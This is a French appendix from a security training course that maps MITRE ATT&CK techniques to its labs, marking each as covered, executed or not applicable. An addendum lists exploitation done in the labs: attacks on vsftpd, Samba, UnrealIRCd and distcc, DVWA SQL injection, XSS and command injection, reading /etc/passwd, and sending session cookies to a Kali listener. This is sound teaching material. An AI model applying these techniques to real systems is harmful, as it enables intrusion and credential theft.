| T1047 | Windows Management Instrumentation | Execution | — | Non applicable — pas de WMI dans les labs Linux |

#### A.5 Chapitre 5 — Audit, durcissement et remédiation

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1087 | Account Discovery | Discovery | Ch5 Lab1 | Couvert (audit) |
| T1069 | Permission Groups Discovery | Discovery | Ch5 Lab1 | Couvert (audit) |
| T1110 / T1110.001 | Brute Force / Password Guessing | Credential Access | Ch5 Lab1 / Lab3 | Couvert (audit défensif) |
| T1021 | Remote Services | Lateral Movement | Ch5 Lab2 | Couvert (audit) |
| T1078 | Valid Accounts | Initial Access / Defense Evasion / Persistence / Privilege Escalation | Ch5 Lab2 | Couvert (audit) |
| T1046 | Network Service Discovery | Discovery | Ch5 Lab4 | Couvert (audit) |
| T1562.004 | Disable or Modify System Firewall | Defense Evasion | Ch5 Lab4 | Couvert (audit / détection) |
| T1190 | Exploit Public-Facing Application | Initial Access | Ch5 Lab5 | Couvert (cartographie) |
| T1203 | Exploitation for Client Execution | Execution | Ch5 Lab5 | Couvert (cartographie) |
| T1210 | Exploitation of Remote Services | Lateral Movement | Ch5 Lab5 | Couvert (cartographie) |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation | Ch5 Lab5 | Couvert (cartographie) |
| T1550.002 | Pass the Hash | Defense Evasion / Lateral Movement | — | Non applicable — aucun lab Pass-the-Hash dans Ch5 |
| T1036 | Masquerading | Defense Evasion | — | Non applicable — l'audit pare-feu relève de T1562.004 |
| T1499 | Endpoint Denial of Service | Impact | — | Non applicable — aucun test DoS dans Ch5 |
| T1539 | Steal Web Session Cookie | Credential Access | — | Non applicable — écart de mapping retiré de l'inventaire |

#### A.6 Techniques legacy et identifiants corrigés

Le script ajoute les six identifiants legacy (`T1043`, `T1075`, `T1418`, `T1452`, `T1493`, `T119`) à partir de sa table interne. Les corrections sémantiques sont documentées dans `modeles/inventaire-techniques.csv` et dans le rapport de correction. Elles ne suppriment aucun identifiant : elles ajoutent une ligne de traçabilité.



#### A.7 Avenant — Exploitation (Lab-07 et Lab-08)

Cet avenant est **séparé** du séquencement de référence des 24 labs. Il documente les techniques réellement exécutées dans Lab-07 et Lab-08, sans renuméroter le plan maître v1.0 et sans modifier les statuts des chapitres 2 à 5.

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1210 | Exploitation of Remote Services | Lateral Movement | Ch1 Lab7 | Exécuté — vsftpd, Samba, UnrealIRCd, distcc |
| T1059.004 | Unix Shell | Execution | Ch1 Lab7, Ch1 Lab8 | Exécuté — `id`, `hostname`, `uname -a`, injection de commande |
| T1190 | Exploit Public-Facing Application | Initial Access | Ch1 Lab8 | Exécuté — DVWA SQLi, XSS, LFI, command injection |
| T1059.007 | JavaScript/JScript | Execution | Ch1 Lab8 | Exécuté — XSS réfléchi et stocké dans Chromium |
| T1005 | Data from Local System | Collection | Ch1 Lab8 | Exécuté — lecture de `/etc/passwd` |
| T1213 | Data from Information Repositories | Collection | Ch1 Lab8 | Exécuté — extraction de la table `users` |
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration | Ch1 Lab8 | Exécuté — callback HTTP vers Kali `8000/tcp` |
| T1539 | Steal Web Session Cookie | Credential Access | Ch1 Lab8 | Exécuté — `PHPSESSID` et `security=low` exfiltrés |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation | Ch3 Lab2 | Exécuté — élévation locale |

> **Lecture** — T1210 et T1059.004 sont exécutés dans Lab-07. T1190, T1059.007, T1005, T1213, T1048 et T1539 sont exécutés dans Lab-08. T1068 est exécuté au chapitre 3 (Lab 2) sur la VM dédiée, avec snapshot. Les 24 entrées du plan maître v1.0 restent la référence.
